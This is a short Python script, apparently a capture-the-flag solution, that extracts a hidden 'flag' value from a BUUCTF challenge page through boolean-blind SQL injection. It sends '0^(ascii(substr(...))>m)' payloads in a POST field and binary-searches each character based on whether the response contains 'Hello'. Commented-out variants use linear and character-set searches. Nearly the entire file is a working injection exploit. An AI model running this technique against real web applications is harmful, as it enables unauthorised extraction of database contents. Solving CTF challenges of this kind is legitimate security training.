import requests as rq
import time

host = 'http://ac7a6112-32f7-48c9-9088-66a935888686.node4.buuoj.cn:81/index.php'


# se = rq.post(url=host, data={'id': "b' or"})
# print(se.text)

flag = ""
payload = {
    "id": ""
}
for i in range(1, 50):
    a = 32
    b = 128
    m = (a + b) >> 1
    while a < b:
        payload["id"] = "0^(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i, m)
        # print(payload["id"])
        se = rq.post(url=host, data=payload)
        # 请求发太快了容易出问题，所以这里的sleep是必须的
        # time.sleep(0.1)
        # 如果猜的数字更小
        if "Hello" in se.text:
            a = m + 1
        else:
            b = m
        m = (a + b) >> 1
    # print("m: ", m, "chr(m): ", chr(m))
    if chr(m) == " ":
        break
    flag += chr(m)
    print(flag)

    # for j in range(32, 129):
    #     payload["id"] = "0^(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i, j)
    #     # print(payload["id"])
    #     se = rq.post(url=host, data=payload)
    #     # 如果猜的数字更小
    #     print(i, j, "Hello" in se.text)
    #     if "Hello" in se.text:
    #         continue
    #     else:
    #         flag += chr(j)
    #         break
    # print(flag)

# charas = ascii_letters + digits + "{-}"

# def dec():
#     global flag
#     for i in range(1, 100):
#         for chara in charas:
#             payload["id"] = "0^(ascii(substr((select(flag)from(flag)),{0},1))={1})".format(i, ord(chara))
#             se = rq.post(url=host, data=payload)
#             if "Hello" in se.text:
#                 flag += chara
#                 if chara == '}':
#                     return
#                 else:
#                     break
#                 print(flag)

# if __name__ == '__main__':
#     dec()
print("flag: ", flag)
